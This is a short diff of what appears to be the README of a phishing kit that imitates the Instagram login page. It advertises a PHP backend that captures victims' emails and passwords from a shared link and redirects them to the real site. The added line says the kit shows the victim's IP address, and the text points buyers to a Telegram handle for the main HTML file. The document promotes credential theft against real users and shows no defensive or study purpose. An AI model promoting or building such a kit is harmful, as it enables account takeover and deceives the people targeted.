@@ -3,6 +3,7 @@ Backend php written for complete extraction of data.
 Complete style.css added.
 Fully responsive to all screen sizes.
 Just add this to a link, get users email and password in return.
+Displays the ip address of the bait.
 After collecting users data, it redirects to the real instagram login page.
 Have fun.
 FOR THE MAIN INDEX.HTML FILE, CHAT ME ON TELEGRAM: @stilllasvegas
